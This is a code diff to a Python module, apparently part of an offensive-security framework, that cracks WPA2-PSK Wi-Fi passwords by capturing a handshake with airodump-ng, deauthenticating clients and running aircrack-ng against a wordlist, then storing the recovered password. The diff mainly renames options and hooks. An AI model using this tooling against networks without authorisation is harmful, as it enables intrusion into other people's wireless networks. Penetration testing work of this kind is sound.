@@ -1,5 +1,5 @@
 # -*- coding: UTF-8 -*-
-from generic import *
+from lib.wifi import *
 
 
 class Wpa2pskCrack(WifiAttackModule):
@@ -16,7 +16,7 @@ class Wpa2pskCrack(WifiAttackModule):
             False,
         ): 5,
         Option(
-            'DURATION',
+            'TIMEOUT',
             "Cracking maximum duration",
             True,
         ): 120,
@@ -27,9 +27,11 @@ class Wpa2pskCrack(WifiAttackModule):
         ): str(Path(__file__).absolute().parent.joinpath("wordlist.txt")),
     })
     path = "auxiliary/wifi"
-    requirements = {'system': ["aircrack-ng", "aireplay-ng", "airodump-ng"]}
+    requirements = {'system': ["aircrack-ng/airmon-ng",
+                               "aircrack-ng/aireplay-ng",
+                               "aircrack-ng/airodump-ng"]}
     
-    def postamble(self):
+    def postload(self):
         for p in self.__procs:
             p.wait()
         self.logger.debug("Removing temporary directory '{}'"
@@ -37,23 +39,30 @@ class Wpa2pskCrack(WifiAttackModule):
         self.temp_dir.rmtree()
         del self.temp_dir
     
-    def preamble(self):
+    def preload(self):
         self.temp_dir = self.files.tempdir()
         self.__procs = []
-        super(Wpa2pskCrack, self).preamble()
+        super(Wpa2pskCrack, self).preload()
+    
+    def prerun(self):
+        r = super(Wpa2pskCrack, self).prerun()
+        if len(self.console.state['TARGETS']) == 0:
+            self.logger.warning("No target available yet ; please use the "
+                                "'scan' command")
+            return False
+        return r
     
     def run(self):
+        t = self.console.state['TARGETS']
         self.logger.warning("Press Ctrl+C to interrupt")
-        bssid = self.config.option('BSSID').value
-        for essid, values in self.console.state['TARGETS'].items():
-            if values[0] == bssid:
-                channel = values[1]
-                break
+        _ = t[self.config.option('ESSID').value]
+        bssid, channel = _['bssid'], _['channel']
         deauth_int = self.config.option('DEAUTH_INTERVAL').value
-        mon_if = self.console.state.get('MONITOR_IF')
+        _ = [i for i, mon in self.console.state['INTERFACES'].items() if mon]
+        mon_if = _[0]
         cmd = "sudo airodump-ng -c {} -w {} --bssid {} {}" \
               .format(channel, self.temp_dir.joinpath("capture"), bssid, mon_if)
-        to = self.config.option('DURATION').value
+        to = self.config.option('TIMEOUT').value
         found = False
         t = 0
         # capture packets on the target BSSID and stop when the WPA handshake is
@@ -90,5 +99,6 @@ class Wpa2pskCrack(WifiAttackModule):
             if "KEY FOUND!" in line:
                 password = line.split("[ ", 1)[1].split(" ]", 1)[0]
                 self.logger.success("Password found: {}".format(password))
+                self.console.state['TARGETS'][essid]['password'] = password
                 return
         self.logger.failure("Password could not be found")
